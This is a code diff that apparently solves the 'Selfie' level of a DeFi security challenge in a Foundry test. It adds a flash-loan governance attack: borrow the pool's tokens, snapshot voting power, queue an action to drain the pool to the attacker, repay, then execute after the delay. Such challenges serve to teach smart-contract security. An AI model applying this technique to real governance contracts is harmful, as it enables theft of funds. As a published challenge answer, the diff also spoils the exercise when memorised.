@@ -47,12 +47,21 @@ contract Selfie is Test {
         /**
          * EXPLOIT START *
          */
-
+        selfiePool.flashLoan(TOKENS_IN_POOL);
+        skip(2 days);
+        simpleGovernance.executeAction(1);
         /**
          * EXPLOIT END *
          */
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
+    }
+
+    function receiveTokens(address token, uint256 amount) external {
+        DamnValuableTokenSnapshot(token).snapshot();
+        bytes memory data = abi.encodeWithSelector(hex"0cf20913", attacker);
+        simpleGovernance.queueAction(address(selfiePool), data, 0);
+        DamnValuableTokenSnapshot(token).transfer(address(selfiePool), amount);
     }
 
     function validation() internal {
